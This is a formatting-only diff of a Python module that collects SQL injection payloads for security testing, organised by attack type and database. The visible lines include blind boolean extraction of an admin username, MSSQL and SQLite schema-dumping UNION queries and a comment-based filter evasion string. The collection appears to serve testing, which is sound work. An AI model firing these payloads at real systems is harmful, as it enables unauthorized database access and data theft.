@@ -5,7 +5,7 @@ This module provides a collection of SQL injection payloads for security testing
 organized by different payload types and databases.
 """
 
-from typing import List, Dict, Any
+from typing import Any, Dict, List
 
 # Basic authentication bypass payloads
 AUTH_BYPASS_PAYLOADS: List[str] = [
@@ -49,7 +49,7 @@ ERROR_BASED_PAYLOADS: List[str] = [
 BLIND_PAYLOADS: List[str] = [
     "' AND 1=1--",
     "' AND 1=0--",
-    "' AND (ASCII(SUBSTRING((SELECT username FROM users WHERE username='admin'),1,1)))=97--", # Checking if first char is 'a'
+    "' AND (ASCII(SUBSTRING((SELECT username FROM users WHERE username='admin'),1,1)))=97--",  # Checking if first char is 'a'
     "1' AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55),1,1)))>1--",
     "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
 ]
@@ -94,7 +94,7 @@ DB_SPECIFIC_PAYLOADS: Dict[str, List[str]] = {
         "' UNION SELECT sqlite_version()--",
         "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
         "' UNION SELECT sql FROM sqlite_master WHERE type='table'--",
-    ]
+    ],
 }
 
 # Code injection / command execution payloads
@@ -116,10 +116,11 @@ EVASION_PAYLOADS: List[str] = [
     "' OR /* COMMENT */ 1=1--",
 ]
 
+
 def get_all_payloads() -> List[str]:
     """
     Get all SQL injection payloads from all categories.
-    
+
     Returns:
         A list of all SQL injection payloads
     """
@@ -131,25 +132,26 @@ def get_all_payloads() -> List[str]:
     all_payloads.extend(TIME_BASED_PAYLOADS)
     all_payloads.extend(DANGEROUS_PAYLOADS)
     all_payloads.extend(EVASION_PAYLOADS)
-    
+
     # Add database-specific payloads
     for db_payloads in DB_SPECIFIC_PAYLOADS.values():
         all_payloads.extend(db_payloads)
-    
+
     return all_payloads
+
 
 def get_payloads_by_type(payload_type: str) -> List[str]:
     """
     Get SQL injection payloads for a specific type.
-    
+
     Args:
-        payload_type: The type of payloads to retrieve 
-                     (auth_bypass, union, error_based, blind, time_based, 
+        payload_type: The type of payloads to retrieve
+                     (auth_bypass, union, error_based, blind, time_based,
                       dangerous, evasion, or a specific database name)
-    
+
     Returns:
         A list of payloads for the specified type
-    
+
     Raises:
         ValueError: If the payload type is not recognized
     """
@@ -162,31 +164,36 @@ def get_payloads_by_type(payload_type: str) -> List[str]:
         "dangerous": DANGEROUS_PAYLOADS,
         "evasion": EVASION_PAYLOADS,
     }
-    
+
     # Check for database-specific payloads
     if payload_type.lower() in DB_SPECIFIC_PAYLOADS:
         return DB_SPECIFIC_PAYLOADS[payload_type.lower()]
-    
+
     # Check for general payload types
     if payload_type.lower() in payload_types:
         return payload_types[payload_type.lower()]
-    
-    raise ValueError(f"Unknown payload type: {payload_type}. Available types: {', '.join(list(payload_types.keys()) + list(DB_SPECIFIC_PAYLOADS.keys()))}")
+
+    raise ValueError(
+        f"Unknown payload type: {payload_type}. Available types: {', '.join(list(payload_types.keys()) + list(DB_SPECIFIC_PAYLOADS.keys()))}"
+    )
+
 
 def get_payloads_for_database(database: str) -> List[str]:
     """
     Get SQL injection payloads specific to a database type.
-    
+
     Args:
         database: The database type (mysql, mssql, postgres, oracle, sqlite)
-    
+
     Returns:
         A list of payloads for the specified database
-    
+
     Raises:
         ValueError: If the database type is not recognized
     """
     if database.lower() in DB_SPECIFIC_PAYLOADS:
         return DB_SPECIFIC_PAYLOADS[database.lower()]
-    
-    raise ValueError(f"Unknown database type: {database}. Available databases: {', '.join(DB_SPECIFIC_PAYLOADS.keys())}") 
+
+    raise ValueError(
+        f"Unknown database type: {database}. Available databases: {', '.join(DB_SPECIFIC_PAYLOADS.keys())}"
+    )
